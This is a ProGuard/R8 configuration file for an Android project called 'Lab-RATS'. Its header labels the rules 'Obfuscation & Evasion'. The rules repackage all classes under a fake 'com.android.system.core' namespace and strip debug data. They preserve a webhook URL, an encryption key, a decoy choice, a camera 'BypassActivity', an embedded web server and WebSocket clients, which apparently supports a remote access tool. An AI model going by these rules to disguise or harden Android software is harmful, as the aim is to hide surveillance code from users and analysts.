# ====================================================================
# Hardened ProGuard / R8 Obfuscation & Evasion Rules for Lab-RATS
# ====================================================================

# 1. Strip Debug Information, Source Files, & Line Numbers
-renamesourcefileattribute ''
-keepattributes !SourceFile,!LineNumberTable,!LocalVariableTable,!LocalVariableTypeTable

# 2. Enable Aggressive Code Optimizations & Access Modifications
-allowaccessmodification
-repackageclasses 'com.android.system.core'

# 3. Android Components (Keep classes declared in AndroidManifest.xml so OS can instantiate them, but allow member obfuscation)
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.app.Application
-keep public class * extends androidx.work.ListenableWorker

# Keep WorkManager Worker constructor required for reflection
-keepclasseswithmembers class * extends androidx.work.ListenableWorker {
    public <init>(android.content.Context, androidx.work.WorkerParameters);
}

# 4. Preserve Build-Time Configuration Constants
-keep class com.labs.labrats.BuildConfig {
    public static final java.lang.String WEBHOOK_URL;
    public static final java.lang.String ENCRYPTION_KEY;
    public static final int DECOY_CHOICE;
}

# 5. Core Web Server & WebSocket Protocols
-keep class fi.iki.elonen.NanoHTTPD { *; }
-keep class fi.iki.elonen.NanoHTTPD$IHTTPSession { *; }
-keep class fi.iki.elonen.NanoHTTPD$Response { *; }
-keep class fi.iki.elonen.NanoHTTPD$Response$Status { *; }

-keep class org.java_websocket.** { *; }
-keep class com.google.gson.** { *; }
-keep class okhttp3.OkHttpClient { *; }
-keep class okhttp3.Request { *; }
-keep class okhttp3.WebSocket { *; }
-keep class okhttp3.WebSocketListener { *; }

# 6. Preserve Annotations Required by JavascriptInterface
-keepattributes *Annotation*
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

# 7. Keep Reflection / Native Helpers
-keep class com.labs.labrats.Api24Helper { *; }
-keep class com.labs.labrats.Api30Helper { *; }
-keep class com.labs.labrats.CameraHelper$BypassActivity { *; }
-keep class com.labs.labrats.Obf { *; }

# 8. Do Not Warn on Optional Third-Party Dependencies
-dontwarn fi.iki.elonen.**
-dontwarn org.java_websocket.**
-dontwarn com.google.gson.**
-dontwarn okhttp3.**
-dontwarn okio.**
-dontwarn javax.annotation.**
